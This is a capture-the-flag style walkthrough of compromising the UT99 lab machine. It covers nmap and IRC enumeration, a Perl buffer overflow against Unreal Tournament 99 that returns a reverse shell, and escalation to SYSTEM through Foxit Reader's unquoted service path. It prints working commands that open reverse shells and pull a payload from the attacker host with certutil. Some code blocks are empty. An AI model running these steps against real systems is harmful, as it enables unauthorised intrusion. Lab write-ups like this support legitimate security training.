# UT99

## Nmap

```
sudo nmap 192.168.142.44 -p- -sS -sV

```

Whilst FTP open I was unable to connect successfully without valid credentials as shown below:

![](<../../../.gitbook/assets/image (1899).png>)

Trying the web server we see we are taken to the MadCowz website.

![](<../../../.gitbook/assets/image (1900).png>)

Running `whatweb` against the web server shows it is running Apache 2.4.16 on a 32-bit Windows host.

![](<../../../.gitbook/assets/image (1901).png>)

From here nothing else too interesting was found on the web sever by means of exploitation. MySQL login was also denied to my attacking machine.

However, we do have IRC open on a large range of ports 6660-7000,7007. Connecting to these ports with command line options was proving unreliable due to frequent disconnections. Installing HexChat proved much more successful.

```
sudo apt-get install hexchat
```

With HexChat open add a network and use the settings as per shown below. Ensuring the correct IP is set.

![](<../../../.gitbook/assets/image (1903).png>)

After doing so close the window and then connect to the new network. You should see a similar screen as below:

![](<../../../.gitbook/assets/image (1904).png>)

From here go to `Server --> Channel List --> Perform a wildcard * search on the defaultsettings` to find the channel **#ut99**.

![](<../../../.gitbook/assets/image (1905).png>)

This channel identifies the server is intended for Unreal Tournament 99 which we know is also running on Windows due to previous enumeration. Joining the channel also reveals the user Daisy.

Searching for Unreal Tournament 99 exploits for Windows on exploit-db shows the following:

{% embed url="https://www.exploit-db.com/exploits/16145" %}

After downloading the exploit code and looking through it we see the following usage example:

```perl
unreal_tournament-bof-win.pl <host> <query port> <reverse ip> <reverse port>
```

We know from the HexChat and Nmap enumeration that the server for UT99 is running on port 7778. I set up a `netcat` listener on my attacking machine to port 80. I then used the following command to connect to the target server.

```perl
perl ut99.pl 192.168.142.44 7778 192.168.49.142 80
```

Resulting in a reverse shell.

From here with standard enumeration we find the directory `C:\ftp `containing the following contents.

```

The version of Foxit Reader shown 7.0.6.1126 appears to be vulnerable to an unquoted service path privilege escalation.

Checking installed software on the target system we can see Foxit Reader is installed.

Querying the service on the target systems shows the service is running in the context of SYSTEM and the binary path indeed contains spaces and is not wrapped in quotes.

```
cmd:>sc qc FoxitCloudUpdateService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService

```

I then tested for write privileges in the binary path by creating a text file in the `C:\Program Files (x86)\Foxit Software\Foxit Reader\` path.

```
echo Hello > test.txt
```

Checking the contents of the directory after doing so we see the test.txt file.

```bash

```

I then performed a test reboot of the machine and confirmed that as the user Daisy I was able to reboot the machine. Currently this looks like we have a path to privilege escalation.

Firstly using `msfvenom` I created a stageless reverse shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.142 LPORT=80 -f exe -o Foxit.exe
```

I then uploaded this to the directory `C:\Program Files (x86)\Foxit Software\Foxit Reader\`

```bash
certutil.exe -f -urlcache -split http://<IP>/Foxit.exe
```

After the upload was completed I started a netcat listener on my attacking machine then reboot the target system.

```bash
shutdown.exe -r -f -t 1
```

Shortly after I was able to obtain privileges as SYSTEM.
